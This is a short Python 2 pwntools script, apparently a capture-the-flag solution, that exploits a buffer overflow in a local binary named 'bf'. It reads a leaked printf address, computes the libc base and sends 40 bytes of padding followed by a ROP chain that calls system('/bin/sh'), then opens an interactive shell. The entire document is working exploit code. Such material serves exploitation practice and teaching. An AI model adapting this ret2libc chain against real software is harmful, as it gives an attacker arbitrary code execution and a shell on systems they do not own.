#!/usr/bin/env python2

from pwn import *

elf = ELF('./bf')
local = True

if local:
	p = elf.process()
	libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

p.recvuntil("Here I am: ")
printf = (int(p.recv().strip(), 16))
print("printf", hex(printf))

libc.address = printf - libc.symbols['printf']
print("libc.address", hex(libc.address))


pop_rdi = 0x0000000000400793
#system = libc.search("system").next()
system = libc.symbols["system"]
bin_sh = libc.search("/bin/sh").next()
# 0x7ffff7b97e9a
rop_chain = [
	pop_rdi, bin_sh,
	0x000000000040054e,
	system
	]
rop_chain = ''.join([p64(r) for r in rop_chain])

payload = 'A'*40 + rop_chain
p.sendline(payload)
p.interactive()

